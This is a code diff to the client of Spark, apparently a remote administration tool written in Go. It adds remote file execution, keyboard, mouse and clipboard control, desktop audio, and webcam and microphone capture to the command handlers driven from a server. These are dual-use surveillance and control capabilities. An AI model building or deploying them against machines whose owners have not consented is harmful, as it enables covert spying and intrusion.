@@ -2,47 +2,64 @@ package core
 
 import (
 	"Spark/client/common"
+	"Spark/client/service/audio"
 	"Spark/client/service/basic"
 	"Spark/client/service/desktop"
 	"Spark/client/service/file"
 	"Spark/client/service/process"
 	Screenshot "Spark/client/service/screenshot"
 	"Spark/client/service/terminal"
+	"Spark/client/service/webcam"
 	"Spark/modules"
 	"github.com/kataras/golog"
-	"os"
 	"os/exec"
 	"reflect"
 	"strings"
 )
 
 var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
-	`PING`:             ping,
-	`OFFLINE`:          offline,
-	`LOCK`:             lock,
-	`LOGOFF`:           logoff,
-	`HIBERNATE`:        hibernate,
-	`SUSPEND`:          suspend,
-	`RESTART`:          restart,
-	`SHUTDOWN`:         shutdown,
-	`SCREENSHOT`:       screenshot,
-	`TERMINAL_INIT`:    initTerminal,
-	`TERMINAL_INPUT`:   inputTerminal,
-	`TERMINAL_RESIZE`:  resizeTerminal,
-	`TERMINAL_PING`:    pingTerminal,
-	`TERMINAL_KILL`:    killTerminal,
-	`FILES_LIST`:       listFiles,
-	`FILES_FETCH`:      fetchFile,
-	`FILES_REMOVE`:     removeFiles,
-	`FILES_UPLOAD`:     uploadFiles,
-	`FILE_UPLOAD_TEXT`: uploadTextFile,
-	`PROCESSES_LIST`:   listProcesses,
-	`PROCESS_KILL`:     killProcess,
-	`DESKTOP_INIT`:     initDesktop,
-	`DESKTOP_PING`:     pingDesktop,
-	`DESKTOP_KILL`:     killDesktop,
-	`DESKTOP_SHOT`:     getDesktop,
-	`COMMAND_EXEC`:     execCommand,
+	`PING`:              ping,
+	`OFFLINE`:           offline,
+	`LOCK`:              lock,
+	`LOGOFF`:            logoff,
+	`HIBERNATE`:         hibernate,
+	`SUSPEND`:           suspend,
+	`RESTART`:           restart,
+	`SHUTDOWN`:          shutdown,
+	`SCREENSHOT`:        screenshot,
+	`TERMINAL_INIT`:     initTerminal,
+	`TERMINAL_INPUT`:    inputTerminal,
+	`TERMINAL_RESIZE`:   resizeTerminal,
+	`TERMINAL_PING`:     pingTerminal,
+	`TERMINAL_KILL`:     killTerminal,
+	`FILES_LIST`:        listFiles,
+	`FILES_FETCH`:       fetchFile,
+	`FILES_REMOVE`:      removeFiles,
+	`FILES_UPLOAD`:      uploadFiles,
+	`FILE_UPLOAD_TEXT`:  uploadTextFile,
+	`FILE_EXEC`:         execFile,
+	`PROCESSES_LIST`:    listProcesses,
+	`PROCESS_KILL`:      killProcess,
+	`DESKTOP_INIT`:      initDesktop,
+	`DESKTOP_PING`:      pingDesktop,
+	`DESKTOP_KILL`:      killDesktop,
+	`DESKTOP_SHOT`:      getDesktop,
+	`DESKTOP_INPUT`:     inputDesktop,
+	`DESKTOP_CONFIG`:    configDesktop,
+	`DESKTOP_CLIPBOARD`: clipboardDesktop,
+	`DESKTOP_AUDIO`:     audioDesktop,
+	`DESKTOP_CODEC`:     codecDesktop,
+	`COMMAND_EXEC`:      execCommand,
+	`WEBCAM_LIST`:       listWebcams,
+	`WEBCAM_INIT`:       initWebcam,
+	`WEBCAM_PING`:       pingWebcam,
+	`WEBCAM_KILL`:       killWebcam,
+	`WEBCAM_SELECT`:     selectWebcam,
+	`AUDIO_LIST`:        listAudioDevices,
+	`AUDIO_INIT`:        initAudio,
+	`AUDIO_PING`:        pingAudio,
+	`AUDIO_KILL`:        killAudio,
+	`AUDIO_SELECT`:      selectAudio,
 }
 
 func ping(pack modules.Packet, wsConn *common.Conn) {
@@ -57,9 +74,7 @@ func ping(pack modules.Packet, wsConn *common.Conn) {
 
 func offline(pack modules.Packet, wsConn *common.Conn) {
 	wsConn.SendCallback(modules.Packet{Code: 0}, pack)
-	stop = true
-	wsConn.Close()
-	os.Exit(0)
+	stopAndExit(wsConn, 0)
 }
 
 func lock(pack modules.Packet, wsConn *common.Conn) {
@@ -220,6 +235,43 @@ func removeFiles(pack modules.Packet, wsConn *common.Conn) {
 	}
 }
 
+func execFile(pack modules.Packet, wsConn *common.Conn) {
+	rawPath, ok := pack.GetData(`path`, reflect.String)
+	if !ok || len(strings.TrimSpace(rawPath.(string))) == 0 {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
+		return
+	}
+	args := ""
+	if rawArgs, exists := pack.Data[`args`]; exists {
+		switch v := rawArgs.(type) {
+		case string:
+			args = v
+		case []any:
+			parts := make([]string, 0, len(v))
+			for _, item := range v {
+				if s, ok := item.(string); ok {
+					parts = append(parts, s)
+				}
+			}
+			if len(parts) > 0 {
+				args = strings.Join(parts, " ")
+			}
+		}
+	}
+	workdir := ""
+	if val, ok := pack.GetData(`workdir`, reflect.String); ok {
+		workdir = val.(string)
+	}
+	pid, err := file.Exec(rawPath.(string), args, workdir)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `FILE_EXEC`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `FILE_EXEC`, Code: 0, Data: map[string]any{
+		`pid`: pid,
+	}}, pack)
+}
+
 func uploadFiles(pack modules.Packet, wsConn *common.Conn) {
 	var (
 		start, end int64
@@ -340,6 +392,51 @@ func getDesktop(pack modules.Packet, wsConn *common.Conn) {
 	desktop.GetDesktop(pack)
 }
 
+func inputDesktop(pack modules.Packet, wsConn *common.Conn) {
+	err := desktop.HandleInput(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INPUT`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INPUT`, Code: 0}, pack)
+}
+
+func configDesktop(pack modules.Packet, wsConn *common.Conn) {
+	err := desktop.HandleConfig(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_CONFIG`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `DESKTOP_CONFIG`, Code: 0}, pack)
+}
+
+func codecDesktop(pack modules.Packet, wsConn *common.Conn) {
+	err := desktop.HandleCodec(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_CODEC`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `DESKTOP_CODEC`, Code: 0}, pack)
+}
+
+func clipboardDesktop(pack modules.Packet, wsConn *common.Conn) {
+	err := desktop.HandleClipboard(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_CLIPBOARD`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `DESKTOP_CLIPBOARD`, Code: 0}, pack)
+}
+
+func audioDesktop(pack modules.Packet, wsConn *common.Conn) {
+	err := desktop.HandleAudio(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_AUDIO`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `DESKTOP_AUDIO`, Code: 0}, pack)
+}
+
 func execCommand(pack modules.Packet, wsConn *common.Conn) {
 	var proc *exec.Cmd
 	var cmd, args string
@@ -373,4 +470,76 @@ func execCommand(pack modules.Packet, wsConn *common.Conn) {
 
 func inputRawTerminal(pack []byte, event string) {
 	terminal.InputRawTerminal(pack, event)
+}
+
+// Webcam handlers
+func listWebcams(pack modules.Packet, wsConn *common.Conn) {
+	devices, err := webcam.ListDevices()
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+	} else {
+		wsConn.SendCallback(modules.Packet{Code: 0, Data: map[string]any{`devices`: devices}}, pack)
+	}
+}
+
+func initWebcam(pack modules.Packet, wsConn *common.Conn) {
+	err := webcam.InitWebcam(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `WEBCAM_INIT`, Code: 1, Msg: err.Error()}, pack)
+	} else {
+		wsConn.SendCallback(modules.Packet{Act: `WEBCAM_INIT`, Code: 0}, pack)
+	}
+}
+
+func pingWebcam(pack modules.Packet, wsConn *common.Conn) {
+	webcam.PingWebcam(pack)
+}
+
+func killWebcam(pack modules.Packet, wsConn *common.Conn) {
+	webcam.KillWebcam(pack)
+}
+
+func selectWebcam(pack modules.Packet, wsConn *common.Conn) {
+	err := webcam.HandleSelect(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `WEBCAM_SELECT`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `WEBCAM_SELECT`, Code: 0}, pack)
+}
+
+// Audio handlers
+func listAudioDevices(pack modules.Packet, wsConn *common.Conn) {
+	devices, err := audio.ListDevices()
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+	} else {
+		wsConn.SendCallback(modules.Packet{Code: 0, Data: map[string]any{`devices`: devices}}, pack)
+	}
+}
+
+func initAudio(pack modules.Packet, wsConn *common.Conn) {
+	err := audio.InitAudio(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `AUDIO_INIT`, Code: 1, Msg: err.Error()}, pack)
+	} else {
+		wsConn.SendCallback(modules.Packet{Act: `AUDIO_INIT`, Code: 0}, pack)
+	}
+}
+
+func pingAudio(pack modules.Packet, wsConn *common.Conn) {
+	audio.PingAudio(pack)
+}
+
+func killAudio(pack modules.Packet, wsConn *common.Conn) {
+	audio.KillAudio(pack)
+}
+
+func selectAudio(pack modules.Packet, wsConn *common.Conn) {
+	err := audio.HandleSelect(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `AUDIO_SELECT`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `AUDIO_SELECT`, Code: 0}, pack)
 }
